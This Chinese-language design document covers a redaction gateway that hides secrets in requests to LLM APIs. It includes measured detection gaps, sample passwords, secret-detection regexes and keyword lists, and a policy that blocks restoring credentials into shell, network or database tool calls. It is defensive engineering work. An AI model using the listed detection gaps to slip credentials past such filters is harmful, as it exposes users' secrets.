# Cosy Redact Gateway v2 设计文档

- 基线：`main`，`package.json` 0.3.0，`worker.js` 890 行，零运行时依赖
- 状态：设计草案。第一批测试已落地（`test/` 四个文件，全量 67 tests / 60 pass / 7 fail），7 个失败项即本文档的目标行为规格
- 标记约定：**【实测】** 本机复现、数字可查；**【设计决定】** 已选定但未实现验证；**【待验证】** 需实验数据才能定稿

## 1. 背景与威胁模型

Cosy Redact Gateway 是客户端与上游 LLM API 之间的隐私中继：把请求体中的敏感值替换为占位符后上行，模型回显占位符时在出方向还原。

目标用户是维护 AWS / Kubernetes 环境的 DevOps 工程师，典型输入是整段 `kubectl describe` 输出、CloudTrail 事件 JSON、`.env`、Helm values、CI 日志与 Terraform 计划。

威胁模型沿用 `SECURITY.md`：上游可以存储或检查它收到的一切；中继不试图让不可信上游变得可信，只降低**误披露**面。防模型主动套取机密（prompt injection / 社工）不在当前范围内，由第 6.8 节的 sink 策略部分覆盖。

设计约束不变：单文件、零运行时依赖、只用 Web Fetch / Web Streams / Web Crypto，可运行于 Cloudflare Workers、Deno、Node 20+。

## 2. 现状基线（v0.3.0）

【实测】当前实现要点：

1. 路由 `https://<host>/<flags>$<upstream-url>`，flags 为 `HPSIBEG` 子集，空 flag 段表示全开（`parseFlags`）。
2. 请求体必须是 JSON（非 JSON 非空体 fail-closed 415），递归处理字符串叶子（`redactJson`），`shouldSkipString` 跳过控制字段与多模态二进制字段。
3. `findSensitiveSpans`（`worker.js:464`）已把各 detector 跑在**原文**上，再按 priority / 长度 / 起点做 overlap merge：`existing`(1000) > `gitleaks`(120) > `sk-`(110) > `identity`(100) > `email`(90) > `phone`(88) > `bank`(85) > `entropy`(10)。**检测顺序不是下述缺陷的成因**，3.1 的漏报发生在候选形成之前。
4. 占位符为 `{{Redact:<sha256(raw + runtime_salt)>}}`，固定 75 字节（`TOKEN_LENGTH`），同一 runtime 内同明文得到同一 token。
5. 响应侧分非流式（`restoreJson`）与流式 SSE（`SseRestorer`：按 channel 拼接 delta，保留可能是 token 前缀的后缀）。
6. Redact Notice 恒定注入最后一条 user 消息；未知 token 在所有方向原样透传，没有 sink 概念。

`H`（高熵）把文本切成 ASCII 字母数字块，块长 ≤ 8 或纯数字跳过，再用英文 bigram 交叉熵打分，阈值按长度线性插值（length=9 → 5.4240，length=17 → 5.1502），另加 Shannon 多样性下限。

## 3. 已实测确认的缺陷

### 3.1 密码类秘密的系统性漏报

现行 `generic-api-key` 规则（`worker.js:405`）的 value 字符类为 `(?:[\w.=-]{10,150}|[a-z0-9][a-z0-9+/]{11,}={0,3})`，不接受 `@ ! # $ % ^ & * ( )` 等符号；真实密码几乎都带符号，候选在 regex 阶段就不成立。高熵 detector 又按 `[A-Za-z0-9]+` 切块，符号进一步把候选切碎。

【实测】全部 flag 开启（`/$...`）：

| 输入 | 网关输出 | 判定 |
|---|---|---|
| `DB_PASSWORD=Pr0d-P@ssw0rd-Xy9Zk2mQ` | 原样 | MISS |
| `DB_PASSWORD=hello123!` | 原样 | MISS |
| `password: Pr0d-P@ssw0rd-Xy9Zk2mQ` | 原样 | MISS |
| `export TOKEN=Pr0d-P@ssw0rd-Xy9Zk2mQ` | 原样 | MISS |
| `Authorization: Bearer Pr0d-P@ssw0rd-Xy9Zk2mQ` | 原样 | MISS |
| `?access_token=Pr0d-P@ssw0rd-Xy9Zk2mQ` | 原样 | MISS |
| `AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` | `AWS_SECRET_ACCESS_KEY = {{Redact:7563cfc2…}}/K7MDENG/bPxRfiCYEXAMPLEKEY` | 部分 |

最后一行需精确表述：只有 `/` 之前的块 `wJalrXUtnFEMI` 被替换，`K7MDENG/bPxRfiCYEXAMPLEKEY` 仍以明文上行——该样本并未被"完整兜住"，只是被部分截断替换。

```bash
node -e 'import("./worker.js").then(async (m)=>{const c=new m.RedactionContext({salt:"repro"}),f=m.parseFlags("");for(const s of ["DB_PASSWORD=Pr0d-P@ssw0rd-Xy9Zk2mQ","DB_PASSWORD=hello123!","password: Pr0d-P@ssw0rd-Xy9Zk2mQ","export TOKEN=Pr0d-P@ssw0rd-Xy9Zk2mQ","Authorization: Bearer Pr0d-P@ssw0rd-Xy9Zk2mQ","?access_token=Pr0d-P@ssw0rd-Xy9Zk2mQ","AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"])console.log((await c.redactText(s,f))===s?"MISS":"HIT ",s)})'
```

根因（已进一步定位）：keyword 预筛**已经命中**——`DB_PASSWORD`、`password`、`TOKEN` 都在 `generic-api-key` 的 keywords 集合里。真正失败的是 value 字符类 `(?:[\w.=-]{10,150}|[a-z0-9][a-z0-9+/]{11,}={0,3})`，它不接受 `@` 和 `!`，真实密码几乎必然带这类符号，因此候选根本形成不了。对照实测（同一 key 名，只改 value 字符集）：

| 样本 | 判定 |
|---|---|
| `DB_PASSWORD=Pr0d-P@ssw0rd-Xy9Zk2mQ` | MISS（`@`） |
| `DB_PASSWORD=hello123!` | MISS（`!`） |
| `DB_PASSWORD=Pr0d-Passw0rdXy9Zk2mQ` | HIT |
| `DB_PASSWORD=SuperSecret123` | HIT |
| `DB_PASSWORD=cGFzc3dvcmQxMjM0NTY3OA==` | HIT |

所以这一项的修法不是"补 key 名识别"（key 名条件已满足），而是**先解析绑定形式、再取整个 value**——即结构化上下文提取，而不是继续加宽 value 字符类（后者只会把误报面一起放大）。测试：`test/structured-context.test.js`。

### 3.2 占位符 `{{Redact:…}}` 破坏宿主语法

`{` 在 YAML 中是 flow mapping 起始符，`{{Redact:abc}}` 会被解析成嵌套映射而不是标量。

【实测·已修正】PyYAML 6.0.1：`password: {{Redact:abc}}` → `ConstructorError: while constructing a mapping`。

【修正说明】`{{Redact:<64 hex>}}` 单看是**合法**的 YAML flow mapping（`{ {Redact:…} }` 嵌套），也就是说它的危害**不是"解析失败"，而是"类型被改写"**：字段本来是 string，替换后成为 mapping。仓库内最小校验器据此断言的是类型改写而非解析错误，见 `current placeholder is unusable in Kubernetes and other typed fields [GREEN NOW]`。真实 K8s 场景下危害是确定的：`Secret.data` 要求 base64，花括号占位符不是合法 base64（见 3.5）。

影响面是 YAML（Helm values、K8s 清单、CI 配置、Ansible）：下游解析器直接拒绝或误解析，模型会去分析一个本来不存在的语法错误。`.env`、shell、URL query、HTTP header 不受影响（`{` 在那里只是普通字符），但 shell 中必须加引号，这一点已由 `current placeholder leaves URL and header usable, but needs shell quoting [GREEN NOW]` 固化。

【待验证】同一 `{{ }}` 定界符与 Helm/Go template 冲突（Helm 渲染 `{{ ... }}` 会报模板错误）。本机未做 helm 渲染验证，但属同一根因，v2 选型一并规避。

### 3.3 高熵判据与基础设施域系统性错配

`H` 的判据是"看起来随机"，而 AWS / K8s 世界里几乎所有基础设施标识都看起来随机，且它们恰好是排障唯一的关联抓手。

【实测】`H` 判定：

| 样本 | 块长 | entropy 分数 | 阈值 | 判定 |
|---|---:|---:|---:|---|
| `0a1b2c3d4e5f67890`（实例 ID 后缀） | 17 | 7.3725 | 5.1502 | REDACT |
| `0a1b2c3d4e5f6789`（安全组 ID 后缀） | 16 | 7.4997 | 5.1799 | REDACT |
| `7d9f8c6b5d`（ReplicaSet hash） | 10 | 7.2845 | 5.3667 | REDACT |

`i-0a1b2c3d4e5f67890` 输出 `i-{{Redact:f752d970…}}`，`subnet-0a1b2c3d4e5f67890` 输出 `subnet-{{Redact:f752d970…}}`：前缀保留、值被替换，替换后既不是合法资源 ID，也无法再与真实资源对应。附带发现：token 只由明文决定，上述两个不同资源得到**同一个** token，在模型视角被合并成一个实体。

```bash
node -e 'import("./worker.js").then(m=>{for(const b of ["0a1b2c3d4e5f67890","0a1b2c3d4e5f6789","7d9f8c6b5d"])console.log(b,m.entropyScore(b).toFixed(4),m.entropyThreshold(b.length).toFixed(4),m.isHighEntropyBlock(b))})'
```

对照：`eks-prod-nodegroup-ng-1` 的 `nodegroup` 块分数 4.3468 < 阈值 5.4240，不被替换——`H` 在这类文本上删掉的恰好是标识的随机部分。

### 3.4 主张流程：样本合法性优先

过程中出现过 4 次错误结论，全部源于不合法的样本或未验证的推理。两个已查证案例：

- 曾断言 Gitleaks 的 AWS 规则 `[A-Z2-7]{16}` 是 bug（"应为 `[A-Z0-9]`"）。官方源码 `cmd/generate/config/rules/aws.go` 确认 `[A-Z2-7]` 正确，紧邻注释为 `current AWS tokens cannot contain [0,1,8,9]`；构造样本 `AKIAJ9X2K4M7P3Q8R5T6` 含 `9`，是 AWS 永不签发的字符串。
- 曾用只有 17 个 base64 字符的过短 PEM 样本断言 PGP 私钥漏报。本仓库 `private-key` 规则要求 `[\s\S-]{64,}`；合法长度样本能被拦住。

**流程规则（进入 backlog 的门槛）**：任何"漏报 / 误报"主张必须同时附带（1）可复现样本（原始输入，不截断、不改写）；（2）样本合法性证明（官方文档 / 上游源码 / 真实服务接受的证据，含来源与版本）；（3）一条可直接执行的复现命令。三者缺一不进 backlog、不进测试。

### 3.5 K8s `Secret.data` 必须是合法 base64

【实测】真实 API server（client `v1.36.3` / server `v1.35.1`，minikube，`kubectl apply --dry-run=server`）：

| `data.password` 取值 | 结果 |
|---|---|
| `CRG_K7M2Q9_T8F4N6P3` | `BadRequest: … illegal base64 data at input byte 3` |
| `Q1JHX0FCQ18xMjM=` | `secret/crg-b64-test created (server dry run)` |
| `Q1JHX0FCQ18xMjM`（缺填充） | `illegal base64 data at input byte 12` |
| `Q1JHX0FCQ18xMjM==`（多填充） | `illegal base64 data at input byte 16` |

K8s 只校验能否 base64 解码，不校验解码后的长度。`Q1JHX0FCQ18xMjM=` 正是 `base64("CRG_K7M2Q9_T8F4N6P3")`：把 token 再 base64 可行，直接塞 portable token 不可行，填充位必须严格正确。

```bash
printf 'apiVersion: v1\nkind: Secret\nmetadata:\n  name: crg-b64-test\ntype: Opaque\ndata:\n  password: CRG_K7M2Q9_T8F4N6P3\n' | kubectl apply --dry-run=server -f -
```

### 3.6 分层 DLP 的三组对照

【实测】完整 tool-call 回路模拟（网关 + 外层 DLP + 本地磁盘 `grep`），观测模型发出的 `grep` 模式与命中行数；已固化为 `tool-call fidelity depends on the outer layer, not on wrapping [GREEN NOW]`：

| 配置 | 模型发出的 grep 模式 | 磁盘命中行数 |
|---|---|---:|
| A：网关二次脱敏 + 外层 DLP 只覆盖入方向 | `CRG_K7M2Q9_T8F4N6P3` | 0 |
| B：网关二次脱敏 + 外层 DLP 同时覆盖出方向 | 真实明文 | 1 |
| C：网关原样透传外来 token | `CRG_K7M2Q9_T8F4N6P3` | 0 |

结论：决定性变量是**外层 DLP 是否在出方向还原**，不是网关是否包装外来 token。配置 C 比 A 更糟——模型自信地 grep 一个伪值并据此给出结论。"namespace ownership 导致打空"既不成立，也不是成因。

【实测】二次脱敏的触发条件（全 flag，`DB_PASSWORD=<token>` 上下文，已固化为 `current gateway re-wraps most foreign tokens [GREEN NOW]`）：`CRG_K7M2Q9_T8F4N6P3`、`VAULT_TOKEN_xyz789`、`MASKED_abc123def456`、32 位 hex 全部被重新包装；`[[PII_EMAIL_1]]` 因 `[` 不在 value 字符类中原样透传；`api_key=deadbeefdeadbeefdeadbeef` 因过不了 entropy 3.5 门限原样透传。触发条件是 `generic-api-key` 规则（左侧 key 名匹配 + value 字符类 + entropy 门限），不是高熵——这解释了"外来 token 被二次包装"与"高熵误删"为何是两个独立问题。

## 4. 根因归纳

| 编号 | 根因 | 对应缺陷 |
|---|---|---|
| R1 | 判定入口只有 value 形状，key 名只做 keyword 预筛，上下文未进入判定 | 3.1 |
| R2 | 判据与域错配：entropy 度量"像不像随机"，而基础设施标识天然随机 | 3.3 |
| R3 | 表征不分层：一个 75 字节字符串 token 被塞进所有位置，忽略宿主语法与类型约束 | 3.2 / 3.5 |
| R4 | 没有 sink 概念：还原策略与输出通道无关 | 3.6 C |
| R5 | 跨层归属未定义：两层 DLP 各自持有一半映射 | 3.6 A |

## 5. 设计原则

### 5.1 分层唯一归属原则（核心原则）

**同一份数据应当只有一层拥有映射。**

- **独占（EXCLUSIVE）**：网关持有映射，并在自己的出方向边界把 token 还原成明文交给下游；下游不得再对同一路径做还原。
- **纯透传（PASS_THROUGH）**：网关完全不参与该路径——不为其创建 token、不改写、不还原，外来 token 原样进、原样出。

**禁止"参与一半"**：两层 DLP 各自持有一半映射、都不完整时，中间产物既不是明文也不是终态——模型看到伪值（配置 C），或下游拿到一个谁都无法还原的 token（配置 A）。归属必须显式声明、可观测、可测试。

推论：（1）模式是**路由级 / 路径级**配置而非隐式行为，配置 A 与 C 在 v2 中都属配置错误，应被拒绝启动或告警；（2）独占模式下网关必须能证明"我发出的每个 token 我都能还原"，纯透传模式下必须能证明"我一个字节都没改"；（3）还原保真与归属无关——即使网关二次包装了外来 token，只要它能精确还原，外层 DLP 仍可继续完成自己的还原（`re-wrapping preserves the value through the full round trip [GREEN NOW]`），纯透传是语义正确的选择，不是"修复打空"的手段。

### 5.2 证据分级

确定性证据优先于概率证据；ML 不得推翻确定性规则（见 6.3）。

### 5.3 parser 是增加结构证据，不是新的安全边界

解析失败的区域必须计入 UNKNOWN 并继续走后续 detector（见 6.7）。

### 5.4 一切主张可复现

测试与缺陷主张必须满足 3.4 的三项门槛。

## 6. 目标架构

### 6.1 管线总览

```text
request body
  ├─[1] Structured Context Extraction (SCE)   路径 + 内嵌微格式 + key 名
  ├─[2] Candidate generation                   格式规则 / value 形状 / entropy / ML
  ├─[3] Evidence grading                        HARD_SECRET | SOFT_SIGNAL
  ├─[4] Infrastructure identifier recognition   AWS / K8s / Git / trace / UUID …
  ├─[5] Policy decision                         preserve | mask | redact(type)
  ├─[6] Surrogate materialization               portable token | base64 surrogate | 不可替换 → fail-closed
  ├─[7] Coverage ledger                         PARSED | PARTIAL | FAILED(=UNKNOWN) + telemetry
  ▼
untrusted upstream model
  ▼
[8] Tool Sink Policy ── assistant text: restore ── tool argument: 默认保持 token ── broker: restore
```

### 6.2 Structured Context Extraction

【设计决定】对每个字符串叶子同时产出两级上下文：

1. **外层 API 路径**：`messages[3].content`、`tools[2].function.parameters.properties.password`、`input[0].content[1].text` 等，来自现有 `redactJson` 的 path 数组。
2. **内嵌微格式**：在字符串内部识别 `.env`（`KEY=VALUE` 行）、YAML（`key: value`）、shell（`export KEY=…`、`KEY=… cmd`）、HTTP header（`Name: value`）、URL query（`?k=v&k2=v2`），产出 `{ region, container, keyName, keyPath }`。

判定优先级：**key 名 > 容器语义 > value 形状**。`DB_PASSWORD`、`password`、`api_key`、`access_token`、`Authorization: Bearer`、`x-api-key` 命中时，value 只需满足"非平凡字符串"即可进入 SOFT_SIGNAL，容器可信时可直接进入 HARD_SECRET。SCE 失败必须降级而非中止：无法识别的区域标记 UNKNOWN，仍走全部 detector。

### 6.3 Hard / Soft 证据分级

【设计决定】

- `HARD_SECRET`：格式明确 + 独立 validator + 正样本集 + 负样本集 + **infra golden corpus 零误删**。满足者直接判定为秘密，ML 分值不得推翻。例：`sk-ant-api03-…`（前缀 + 长度）、Luhn 通过的卡号、PRC 身份证校验位、JWT 三段结构、provider 前缀类规则。
- `SOFT_SIGNAL`：entropy 分数、通用 token 形状、关键词邻近度、分类器分数。只能作为候选，必须可被上下文修正——key 名、容器类型、infra 类别、policy 都可提升或压制它。

`H` 从"最终 verdict"降级为 candidate signal 是本次架构变更的核心。

### 6.4 Infrastructure identifier 识别

【设计决定】单独识别并分类，不写死 "INFRA = 安全"：AWS ARN / 实例 ID / AMI / region / account / requestID（`arn:aws:iam::123456789012:role/x`、`i-…`、`ami-…`、`us-west-2`、`123456789012`）、Git 对象（40 / 64 位 hex SHA）、容器镜像（`sha256:…` digest、`repo/name:tag`）、K8s（UID、nodegroup 名、namespace / 资源名）、分布式追踪（trace ID 32 hex、span ID 16 hex）、通用（UUID 按版本、CIDR / IP、主机名）。分类结果交给 policy：`preserve`（默认，保留排障关联抓手）/ `mask` / `redact`。ARN 可能内嵌 account ID，需按子结构给策略，而不是整类放过。

### 6.5 Token 规范

【设计决定】

```text
CRG_<request-id>_<entity-id>
```

- **严格两段**，语法 `^CRG_[A-Z0-9]{4,}_[A-Z0-9]{4,}$`，实现为 `CRG_<requestId:6>_<entityId:4>`（15 字符）。`TOKEN_LENGTH` **由宽度常量派生，不得硬编码**——硬编码会在流式测试里以极难排查的方式失败（断言在上游 fetch 回调内抛出，请求降级为 502 与空流）。
- 边界断言用**否定字符类** `(?<![A-Za-z0-9_])…(?![A-Za-z0-9_])`，不能用 `\b`：`_` 是词字符，`\b` 在 `…_CRG_` 这类拼接处不成立，会漏配合法 token。
- 字符集不含 `{ } " ' : @ ! = & ? / +`，`[A-Z0-9_]` 在 URL query（RFC 3986 unreserved）、shell、`.env` key、YAML plain scalar、HTTP header 中都不需要转义。
- **受保护 span 的资格只能来自登记，不能来自形状**：`findSensitiveSpans` 不做任何形状 fallback，未传资格即保护为空；`RedactionContext` 以谓词 `isProtectedToken = (v) => tokenToRaw.has(v)` 提供资格。这既支持"铸号过程中产生的新 token"（legacy 重新铸号），也避免任何人用 `CRG_` 形状的标签把秘密夹带过检测。
- **`request-id` = 每请求 CSPRNG 生成**（`createRequestId()`，宽度 6）。这是跨请求不可关联性的**唯一**来源。
- **`entity-id` = 请求内单调分配计数器**（`this.nextToken += 1`，宽度 4，base36 大写）。**不是随机的，也不应该是**——它只需在请求内唯一，并让"同一明文复用同一 token"成为一次廉价查表。
- **两者都不得由明文派生**（不得有 checksum / hash / oracle）。

> **更正（R0.2.1）**：本节此前写的是"`entity-id` 每实体随机生成，**禁止自增计数**"，与实现直接冲突，而且**指错了安全属性**。真正的不变量不是"entity-id 必须随机"，而是：
>
> ```
> cross-request unlinkability  ← 随机 request-id
> no offline oracle            ← 明文不得产生任何 checksum / hash / 取值
> ```
>
> 手工验证：四个不同明文（`0000` / `1234` / `9999` / 一个 AWS key）在同一请求位置各得到一个全新 context，**都拿到 `_0001`**——entity-id 与明文完全无关。不变量测试见 `test/token-syntax.test.js` 的 `R0.2.1` 组。
- 同一请求内同一明文复用同一 token；跨请求必须重新随机。
- **不带任何由原文派生的 checksum**：派生校验位会给低熵秘密（PIN、卡号、短密码）提供离线猜测验证器。该风险已量化为测试：对 `0000 / 1234 / 9999` 取 `djb2` 哈希，高 16 位几乎恒定（`7c53`–`7c58`），只有低位可分（低 2 位 hex 分别为 `05 / 41 / 45`）——"看起来很强"的高位截断 checksum 在它本该保护的候选空间上几乎是常量。
- token 必须自识别（固定前缀），使未知 token 能被识别为"受保护形状"而不是普通文本（见 6.8、8.4）。

### 6.6 Representation / schema 约束需要 surrogate

【设计决定】替换件形态由**位置**决定，而不是全局统一：

| 位置 | 替换件 |
|---|---|
| 普通字符串 / JSON string / 文本 | portable token |
| K8s `Secret.data.*`、`dockerconfigjson`、HTTP Basic、任意已知 base64 位 | base64 surrogate = `base64(token)`，填充位严格正确（依据 3.5 实测） |
| URL query / path | portable token（无需 percent-encode） |
| 类型受限位置（JSON number / boolean / enum / 有 schema 的字段） | 不替换成字符串：按 policy 取 `preserve` / 同类型 mask / `redact` 后 fail-closed |

还原以请求内映射表为准，按字面量匹配对应的 surrogate 形式，不对任意 base64 做启发式解码；surrogate 必须**永不解码出明文**（`base64 decoding the surrogate must never reveal plaintext [RED]`）。

【设计决定】流式还原的 token 长度不再固定：`possibleTokenSuffixLength` 改为按 `CRG_` 前缀 + 语法上界保留后缀（当前硬编码 75 字节，`worker.js:646`）。

### 6.7 Parser coverage 可观测

【设计决定】每个区域产出覆盖记录 `{ region, parser, status: PARSED | PARTIAL | FAILED, bytes }`。`FAILED` 区域计入 `UNKNOWN`，**继续走后续 detector**；绝不允许解析失败成为"跳过检测"或"视为可信"的理由。UNKNOWN 比例进入按请求的 telemetry（只记计数与区域路径，不记内容），可配置为告警或 fail-closed。

### 6.8 Tool Sink Policy（Agent 场景 P0）

【设计决定】还原判定收敛到一个显式接口：

```text
classifyRestore({ text, sink }) -> { action: "preserve" | "block", telemetry: { event } }
```

| Sink | 默认行为 | 理由 |
|---|---|---|
| `assistant_text` | 还原明文；未知 token 透传 + telemetry | 人类阅读路径 |
| `shell` / `network_egress` / `database` / `email` | **不还原**；未知 token 阻断 | 参数会被客户端 / 宿主执行，把凭据还原进 `bash -c` 一类参数等于制造 confused deputy |
| `log_write` 等良性 sink | 透传 | 仅形状不足以阻断 |
| tool result（上行） | 脱敏 | 现有行为，保持 |
| 可信 broker（显式鉴权） | 允许还原 | 唯一例外，需 sink allowlist + 调用方身份 |

阻断条件必须**三个同时成立**：未知 ∧ 受保护形状 ∧ 敏感 sink；任一不成立都不得阻断，否则 `trace_id`、`request_id`、opaque application id、K8s 资源名、ARN 会被误伤。默认不还原会让部分工具调用因拿到 token 而失败，这是可接受的失败模式；配套要求是 notice 向模型说明"该参数不可直接使用，需要 broker"。

### 6.9 Policy 决策表

【设计决定】`verdict × class × sink → action` 三轴独立：`verdict` ∈ {`HARD_SECRET`, `SOFT_SIGNAL`, `INFRA`, `UNKNOWN`}；`class` ∈ {`secret`, `pii`, `infra`, `opaque`}；`sink` ∈ {`upstream_request`, `assistant_text`, `tool_argument`, `telemetry`}。`UNKNOWN` 落到 fail-closed 一侧（如 6.8 的阻断条件），而不是默认放过。

### 6.10 可复现性基线

【设计决定】`test/fixtures/` 约定：每个 fixture 带 `input`、`expected`、`source`（官方文档 / 上游源码链接 + 版本）、`legal: true` 与复现命令；缺 `source` 的 fixture 直接失败，把 3.4 的门槛强制在测试层。

## 7. 数据模型（草案）

```text
Candidate { span, detector, evidence: HARD|SOFT, score, ruleId }
Context   { jsonPath, container: json|dotenv|yaml|shell|header|urlquery, keyName, keyPath, coverage }
Entity    { plaintext, cls: secret|pii|infra|opaque, verdict, token, surrogateForm, policyAction }
Sink      { kind, restore: bool, reason }
```

不变量：（1）`token = f(requestNonce, entityId)`，与 plaintext 无关，同请求同明文复用、跨请求不复用；（2）任一 token 至少有一个已物化 surrogate 形式，还原按字面量匹配；（3）独占模式下出方向必须覆盖所有已物化形式，纯透传模式下不得产生任何 token。

## 8. 第一批测试与验收断言

四个文件已落地，`npm test` 驱动。标记沿用测试文件头部：`[GREEN NOW]` 对当前 `main` 通过（固化现状）；`[RED]` 对当前 `main` 失败（目标行为，即实现完成的验收条件）；`[COUPLING]` 现在通过只是因为生产代码尚未输出目标格式，迁移后必须继续通过。

【实测】当前全量结果：**67 tests / 60 pass / 7 fail / 0 skipped**，7 个失败项即下方标 ★ 的用例。

### 8.1 `test/token-syntax.test.js`（7 例）

- `current placeholder is unusable in Kubernetes and other typed fields [GREEN NOW]` — 现行 `{{Redact:…}}` 不是合法 base64、且内含 `{` 与 `:`，会把 YAML 字段从 string 改写成 mapping（见 3.2 修正说明）。
- `current placeholder leaves URL and header usable, but needs shell quoting [GREEN NOW]` — 现行占位符在 URL query 与 header 中可直接使用，shell 中必须加引号。
- ★ `plaintext-derived checksum is an offline verification oracle [RED]` — 明文派生 checksum 可离线验证猜测（fixture 能区分 `0000/1234/9999`）；目标 token 只有 `[requestId, entityId]` 两个分量，任一分量都不可由明文重算。
- ★ `portable token is a valid YAML plain scalar and shell-safe [RED]` — **纯 token 契约，与 detector 解耦**：不经脱敏，直接断言目标 token 是合法 YAML plain scalar、无需 shell 引号、可作 `.env` key。
- `redacted output is syntactically valid in every host syntax [COUPLING]` — 脱敏产物在五种宿主里语法合法；夹具刻意选用当前 detector **已能检出**的值，使该用例只度量 token 语法。
- ★ 新增 `test/structured-context.test.js`（9 例，5 红）：`.env`/YAML/shell/header/URL 六种绑定形式的漏报，含 4 条 `[GREEN NOW]` 定位用例（证明 keyword 门槛已满足、失败在 value 字符类）与 5 条 `[RED]` 目标用例。
- `portable token is usable as an .env key and as a URL/header value [RED]` — token 满足 `.env` key 语法、`encodeURIComponent(token) === token`、是合法 header value。
- `redaction round-trip is byte-identical for every host syntax [COUPLING]` — 对 YAML / `.env` / shell（带引号）/ header / URL query 五种宿主，`restoreText(redact(text)) === text` 逐字节一致。
- `redaction is idempotent and never nests placeholders [GREEN NOW]` — 二次脱敏不再包装已脱敏值，占位符数量恒为 1。

文件内的 `targetToken()` 只是**形态占位**，entity id 由 `djb2(明文)` 派生，属明文派生分量，实现不得照抄（见第 10 节）。

### 8.2 `test/nested-dlp.test.js`（5 例）

- `current gateway re-wraps most foreign tokens [GREEN NOW]` — 现行实现对 `CRG_…` / `VAULT_TOKEN_…` / `MASKED_…` / 32 位 hex 四类外来 token 全部二次包装，只有含方括号的 `[[PII_EMAIL_1]]` 意外透传。
- `re-wrapping preserves the value through the full round trip [GREEN NOW]` — 二次包装后本层仍能精确还原，外层 DLP 可继续完成自己的还原——"嵌套 DLP 静默丢明文"不成立。
- ★ `registered foreign token must pass through unchanged [RED]` — 已登记外来 token 满足 `input_to_gateway === model_visible === gateway_output`。
- `unregistered secrets are still redacted (no blanket pass-through) [GREEN NOW]` — 未登记的普通秘密仍必须脱敏，透传不能变成一刀切。
- `tool-call fidelity depends on the outer layer, not on wrapping [GREEN NOW]` — 三配置 A/B/C 命中行数 0 / 1 / 0；只有外层 DLP 出方向还原才能让工具调用命中明文。

关键区分：正确的不变量是 `input_to_gateway === model_visible === gateway_output`，**不是**通用的 `model_visible === restored`——正常脱敏本来就让后者不同（`client 发 AKIA… → 模型看到 GW_TOKEN → 客户端收到 AKIA…`）。

### 8.3 `test/k8s-surrogate.test.js`（7 例，2 例需要真实集群）

- `a plain portable token is not accepted by Secret.data [RED] [SKIP-ABLE]` — portable token 不是合法 base64，API server 拒绝并返回 `illegal base64 data`。
- `base64 surrogate of a portable token is canonically padded [RED]` — surrogate 是规范 base64（字符集、`len % 4 === 0`、无多余填充），且解码回 token。
- `padded and unpadded variants are distinguishable (padding is load-bearing) [RED]` — 缺填充与多填充必须被本地严格校验拒绝，不能等 API server 报错。
- `API server accepts the base64 surrogate [RED] [SKIP-ABLE]` — 真实 API server 接受 surrogate。
- `API server rejects a wrongly padded surrogate [GREEN NOW] [SKIP-ABLE]` — 缺填充被 API server 拒绝（失败模式回归）。
- `surrogate length is independent of plaintext length [GREEN NOW]` — surrogate 长度只跟踪 token，不跟踪明文；K8s 不校验解码后长度。
- `base64 decoding the surrogate must never reveal plaintext [RED]` — surrogate 解码后既不含明文也不含明文的 base64，防止"surrogate 其实是明文的 base64"这种静默失效。

无集群时 `[SKIP-ABLE]` 自动跳过，离线断言（规范 base64、严格填充）始终执行——手写 base64 的填充 bug 正是 K8s 会直接拒绝的地方。

### 8.4 `test/restore-miss.test.js`（7 例）

- `unknown token is passed through unchanged today [GREEN NOW]` — 现行实现原样透传未知 token。
- `known token restores in both assistant text and tool arguments [GREEN NOW]` — 已登记 token 在助手文本与 tool 参数中都还原（当前没有 sink 区分）。
- `assistant prose and tool arguments are handled identically today [GREEN NOW]` — 固化"当前无 sink 概念"这一事实。
- ★ `unknown token in assistant text: pass through, no block [RED]` — `action === "preserve"` 且 `telemetry.event === "restore_miss"`。
- ★ `unknown token + protected shape + sensitive sink: BLOCK [RED]` — 对 `shell` / `network_egress` / `database` / `email` 四种敏感 sink，`action === "block"` 且 `telemetry.event === "restore_miss_blocked"`。
- ★ `unknown token in a benign sink is not blocked [RED]` — `log_write` 等良性 sink 仅凭形状不得阻断。
- ★ `non-protected identifiers are never blocked, even in sensitive sinks [RED]` — trace id、UUID 形式 request id、`app_01J8ZK9Q2M4N7P`、K8s 资源名、AWS ARN 在 `shell` sink 下都不得阻断。

这 4 个用例共用目标接口 `classifyRestore({ text, sink })`，阻断条件被断言为「未知 ∧ 受保护形状 ∧ 敏感 sink」三者同时成立。

## 9. 迁移与兼容

【设计决定】出方向只发新 token（`CRG_…`），入方向还原在过渡期同时接受 `{{Redact:<64hex>}}` 与新格式以便灰度，且 `redaction is idempotent and never nests placeholders` 必须继续通过；Redact Notice 文案需重写（现有文案显式描述 `{{Redact:sha256}}`）；`H` 保留为 flag 但语义从"判定"变为"候选信号"，`/$...` 全开行为需在 README 与本文件重新表述；SSE 还原器按 6.6 改造。

`[GREEN NOW]` 用例是行为快照：迁移后其中一部分（如 `current placeholder is unusable in Kubernetes and other typed fields`、`current gateway re-wraps most foreign tokens`、`assistant prose and tool arguments are handled identically today`）应当**失败或改名**，改动必须显式提交，不允许顺手改断言。

分组边界：`token-syntax` 只管 token 格式契约，`structured-context` 只管 detector 覆盖，两者不得互相耦合——否则任一侧的红绿都会给出错误信号。

## 9.1 迁移状态（token 格式）

双格式是过渡态，不是终态：

| 方向 | 状态 |
|---|---|
| 生成 | **只产出 v2**（`CRG_…`）。由 `legacy-token-compat.test.js` 的 `generation never emits the legacy format` 固定。 |
| 还原 | 短期同时识别两种格式，映射表查找是唯一权威：未登记的 token 一律原样保留（既不还原也不改写）。 |
| 输入侧 legacy | 已登记在映射里的 v1 token 会被**重新铸号为 v2**，使同一段对话不出现两种方言；映射在重铸前后保持可用。 |
| 既有测试 | 主链路（`core` / `proxy` / `stream` / `http-integration` / `node-server`）已全部改为格式无关断言（`REDACTED_TOKEN` / `isRedactedText`），不再匹配某一种 token 字面量。 |
| legacy 收口 | 只有 `test/legacy-token-compat.test.js` 触碰 v1 格式（6 例）。待其余消费者迁完，把该文件压缩到最小集合，并删除 `restoreText` 的 legacy 分支与 `LEGACY_TOKEN_*` 常量。 |

迁移期实测到的两个坑，已固化为回归：

1. `assert.match(x, GLOBAL_RE)` **不可用**：带 `g` 的正则 `.test()` 有 `lastIndex` 语义，断言会随调用次数翻转。断言统一用 `isRedactedText()` 或非全局正则。
